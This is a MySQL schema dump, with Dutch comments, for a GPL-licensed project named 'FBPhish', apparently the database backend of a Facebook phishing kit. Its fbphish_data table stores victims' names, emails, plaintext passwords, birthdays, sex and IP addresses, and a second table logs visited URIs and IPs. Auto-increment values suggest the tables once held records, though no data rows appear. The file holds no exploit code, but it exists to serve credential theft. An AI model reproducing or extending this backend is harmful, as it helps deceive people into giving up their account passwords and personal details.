-- FBPhish
-- Copyright (C) 2016  Jamie4224
-- 
-- This program is free software: you can redistribute it and/or modify
-- it under the terms of the GNU General Public License as published by
-- the Free Software Foundation, either version 3 of the License, or
-- any later version.
-- 
-- This program is distributed in the hope that it will be useful,
-- but WITHOUT ANY WARRANTY; without even the implied warranty of
-- MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-- GNU General Public License for more details.
-- 
-- You should have received a copy of the GNU General Public License
-- along with this program.  If not, see http://www.gnu.org/licenses/.



SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `fbphish_data`
--

CREATE TABLE `fbphish_data` (
  `id` int(11) NOT NULL,
  `type` varchar(255) DEFAULT NULL,
  `record_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `first_name` varchar(255) NOT NULL,
  `last_name` varchar(255) NOT NULL,
  `email` varchar(510) NOT NULL,
  `email_confirm` varchar(510) NOT NULL,
  `password` varchar(255) NOT NULL,
  `birthday_day` int(30) NOT NULL,
  `birthday_month` int(30) NOT NULL,
  `birthday_year` int(30) NOT NULL,
  `sex` int(30) NOT NULL,
  `locale` varchar(30) NOT NULL,
  `user_ip` varchar(255) NOT NULL,
  `meta_user_ip` varchar(255) NOT NULL,
  `missing` varchar(2000) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Tabelstructuur voor tabel `fbphish_log_uri`
--

CREATE TABLE `fbphish_log_uri` (
  `id` int(11) NOT NULL,
  `type` varchar(255) DEFAULT NULL,
  `record_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `uri` varchar(2000) NOT NULL,
  `logged_from` varchar(255) NOT NULL,
  `error` varchar(255) NOT NULL,
  `user_ip` varchar(255) NOT NULL,
  `meta_user_ip` varchar(255) NOT NULL,
  `extra` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Indexen voor geëxporteerde tabellen
--

--
-- Indexen voor tabel `fbphish_data`
--
ALTER TABLE `fbphish_data`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexen voor tabel `fbphish_log_uri`
--
ALTER TABLE `fbphish_log_uri`
  ADD UNIQUE KEY `id` (`id`);

--
-- AUTO_INCREMENT voor geëxporteerde tabellen
--

--
-- AUTO_INCREMENT voor een tabel `fbphish_data`
--
ALTER TABLE `fbphish_data`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=25;
--
-- AUTO_INCREMENT voor een tabel `fbphish_log_uri`
--
ALTER TABLE `fbphish_log_uri`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=559;
